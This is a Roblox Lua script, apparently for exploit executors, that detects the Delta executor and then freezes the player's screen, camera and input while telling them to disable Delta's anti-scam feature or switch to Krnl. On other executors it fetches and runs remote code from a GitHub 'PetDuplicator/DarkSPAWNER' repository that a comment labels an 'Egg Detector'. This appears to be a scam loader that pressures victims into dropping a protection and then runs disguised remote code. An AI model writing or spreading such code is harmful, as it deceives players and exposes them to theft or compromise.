-- 🔍 Delta Executor Detection + Freeze Lock by Nelli

local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer
local camera = workspace.CurrentCamera
local gui = player:WaitForChild("PlayerGui")

-- Function to detect executor
local function getExecutorName()
	if identifyexecutor then
		return identifyexecutor()
	elseif getexecutorname then
		return getexecutorname()
	elseif isdelta then
		return "Delta"
	elseif iskrnlclosure then
		return "Krnl"
	elseif syn then
		return "Synapse X"
	elseif is_sirhurt_closure then
		return "SirHurt"
	elseif pebc_execute then
		return "ProtoSmasher"
	elseif isfluxus then
		return "Fluxus"
	else
		return "Unknown"
	end
end

local executor = getExecutorName()
warn("Executor Detected:", executor)

-- If executor is Delta, activate the freeze screen
if executor:lower():find("delta") then
	-- Wait for character
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local rootPart = character:WaitForChild("HumanoidRootPart")

	-- 🌀 Blur screen
	local blur = Instance.new("BlurEffect")
	blur.Name = "DeltaFreezeBlur"
	blur.Size = 25
	blur.Parent = Lighting

	-- 🧊 Freeze player
	humanoid.WalkSpeed = 0
	humanoid.JumpPower = 0
	humanoid.AutoRotate = false
	rootPart.Anchored = true

	-- 🎥 Lock camera
	camera.CameraType = Enum.CameraType.Scriptable
	camera.CFrame = CFrame.new(rootPart.Position + Vector3.new(0, 6, 12), rootPart.Position)

	-- Create UI to match the image
	local screenGui = Instance.new("ScreenGui")
	screenGui.IgnoreGuiInset = true
	screenGui.ResetOnSpawn = false
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	screenGui.Parent = player:WaitForChild("PlayerGui")

	local mainFrame = Instance.new("Frame")
	mainFrame.Size = UDim2.new(0, 500, 0, 300) -- Adjusted size to fit content
	mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
	mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
	mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Dark background
	mainFrame.BorderSizePixel = 0
	mainFrame.Parent = screenGui

	local uiCorner = Instance.new("UICorner", mainFrame)
	uiCorner.CornerRadius = UDim.new(0, 10)

	local title = Instance.new("TextLabel")
	title.Text = "⚠️ Executor Not Supported" -- Warning icon and text
	title.Font = Enum.Font.GothamBold -- Bold font for title
	title.TextSize = 24 -- Larger text size
	title.TextColor3 = Color3.fromRGB(0, 255, 0) -- Green text
	title.BackgroundTransparency = 1
	title.Size = UDim2.new(1, -40, 0, 50)
	title.Position = UDim2.new(0, 20, 0, 20)
	title.TextWrapped = true
	title.TextXAlignment = Enum.TextXAlignment.Center
	title.TextYAlignment = Enum.TextYAlignment.Center
	title.Parent = mainFrame

	local subtitle = Instance.new("TextLabel")
	subtitle.Text = "You're using an unsupported executor (Delta)."
	subtitle.Font = Enum.Font.Gotham
	subtitle.TextSize = 18
	subtitle.TextColor3 = Color3.fromRGB(200, 200, 200) -- Lighter gray for subtitle
	subtitle.BackgroundTransparency = 1
	subtitle.Size = UDim2.new(1, -40, 0, 30)
	subtitle.Position = UDim2.new(0, 20, 0, 70) -- Position below title
	subtitle.TextWrapped = true
	subtitle.TextXAlignment = Enum.TextXAlignment.Center
	subtitle.TextYAlignment = Enum.TextYAlignment.Center
	subtitle.Parent = mainFrame

	local fixText = Instance.new("TextLabel")
	fixText.Text = "To fix:\n- Turn off anti-scam in Delta\n- Or use Krnl executor."
	fixText.Font = Enum.Font.Gotham
	fixText.TextSize = 16
	fixText.TextColor3 = Color3.fromRGB(200, 200, 200)
	fixText.BackgroundTransparency = 1
	fixText.Size = UDim2.new(1, -40, 0, 80)
	fixText.Position = UDim2.new(0, 20, 0, 110) -- Position below subtitle
	fixText.TextWrapped = true
	fixText.TextXAlignment = Enum.TextXAlignment.Center
	fixText.TextYAlignment = Enum.TextYAlignment.Center
	fixText.Parent = mainFrame

	local closingText = Instance.new("TextLabel")
	closingText.Name = "ClosingTimerText"
	closingText.Text = "Closing in 59 seconds..." -- Initial text, will be updated
	closingText.Font = Enum.Font.GothamBold
	closingText.TextSize = 18
	closingText.TextColor3 = Color3.fromRGB(255, 0, 0) -- Red text
	closingText.BackgroundTransparency = 1
	closingText.Size = UDim2.new(1, -40, 0, 30)
	closingText.Position = UDim2.new(0, 20, 0, 200) -- Position below fix text
	closingText.TextWrapped = true
	closingText.TextXAlignment = Enum.TextXAlignment.Center
	closingText.TextYAlignment = Enum.TextYAlignment.Center
	closingText.Parent = mainFrame

	-- Timer for closing text
	local countdown = 59
	local function updateCountdown()
		while countdown >= 0 do
			closingText.Text = "Closing in " .. countdown .. " seconds..."
			task.wait(1)
			countdown = countdown - 1
		end
		-- Optionally, close the game or perform another action after countdown
		-- game:Shutdown() -- Uncomment if you want to shut down the game after countdown
	end
	task.spawn(updateCountdown)


	-- Copy Button
	local copyButton = Instance.new("TextButton")
	copyButton.Size = UDim2.new(0, 200, 0, 40) -- Adjusted size
	copyButton.Position = UDim2.new(0.5, -100, 0, 250) -- Positioned towards the bottom center
	copyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0) -- Green background
	copyButton.Text = "Copy Krnl Link"
	copyButton.Font = Enum.Font.GothamBold -- Bold font for button
	copyButton.TextSize = 18 -- Larger text size
	copyButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
	copyButton.AutoButtonColor = true
	copyButton.Parent = mainFrame

	local buttonCorner = Instance.new("UICorner", copyButton)
	buttonCorner.CornerRadius = UDim.new(0, 6)

	copyButton.MouseButton1Click:Connect(function()
		setclipboard("https://krnl.cat/downloads/")
		copyButton.Text = "Copied!"
		task.wait(1)
		copyButton.Text = "Copy Krnl Link"
	end)


	-- 🔧 Hide TopBar (ESC/menu)
	pcall(function()
		StarterGui:SetCore("TopbarEnabled", false)
	end)

	-- ⛔ Block input backup
	UserInputService.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.Keyboard or input.UserInputType == Enum.UserInputType.Gamepad1 then
			input:CaptureController()
		end
	end)
else
	-- ✅ Not Delta → continue loading Egg Detector script
	loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGarden-updated/PetDuplicator/refs/heads/main/DarkSPAWNER"))()
end
